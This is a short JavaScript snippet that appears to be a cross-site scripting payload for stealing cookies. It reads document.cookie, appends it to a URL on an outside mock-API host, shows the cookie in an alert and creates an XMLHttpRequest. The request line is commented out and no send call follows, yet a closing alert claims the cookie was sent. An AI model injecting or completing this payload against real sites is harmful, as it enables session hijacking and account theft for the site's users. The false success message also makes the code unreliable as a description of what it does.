var url = "https://llorave.free.beeceptor.com/my/api/path?cookie=";

url = url + document.cookie;

alert("magic! your cookie is " + document.cookie);

var xhr = new XMLHttpRequest();
//xhr.open("GET", url, true);

alert("sent the cookie!");
